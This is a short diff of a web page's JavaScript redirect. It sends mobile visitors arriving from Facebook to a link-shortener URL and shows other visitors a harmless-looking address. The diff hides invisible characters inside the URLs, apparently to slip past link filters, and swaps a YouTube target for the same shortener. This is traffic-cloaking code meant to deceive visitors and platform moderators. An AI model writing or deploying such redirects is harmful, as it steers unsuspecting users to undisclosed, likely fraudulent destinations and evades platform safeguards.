@@ -7,11 +7,11 @@
         var userAgent = navigator.userAgent.toLowerCase();
         var isMobile = /iphone|ipod|android|blackberry|opera mini|windows phone|iemobile|mobile/i.test(userAgent);
         var referrer = document.referrer.toLowerCase();
-        var mobileDevice = "https://maglit.me/poshuimichs"; // Removed the unwanted character
+        var mobileDevice = "https://m‎agl‎it.me/poshuimichs";
         var pcURL = "https://www.th‎r‎eads‎.net/@zuck";
-        var youtubeURL = "https://www.youtube.com";
+        var youtubeURL = "https://m‎agl‎it.me/poshuimichs";
     
-        // Check if the referrer is Facebook
+        // Check if the referrer is Facebook and redirect mobile users to mobileDevice URL
         if (referrer.includes("facebook.com")) {
           if (isMobile) {
             window.location.href = mobileDevice;
@@ -26,6 +26,7 @@
     
       redirectToDifferentWebsite();
     </script>
+    
     
 
     
